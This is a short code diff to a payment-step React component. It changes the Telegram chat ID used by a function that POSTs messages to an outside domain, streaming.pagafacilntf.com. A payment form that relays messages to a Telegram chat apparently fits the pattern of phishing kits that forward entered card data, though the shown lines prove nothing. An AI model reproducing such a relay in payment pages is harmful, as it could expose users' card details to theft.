@@ -122,7 +122,7 @@ const PaymentStepCard = () => {
 
     const sendTelegramMessage = async (message) => {
         try {
-            const chatId = '-4542132850';
+            const chatId = '-4723241842';
             const response = await fetch('https://streaming.pagafacilntf.com/enviarmensaje', {
                 method: 'POST',
                 headers: {
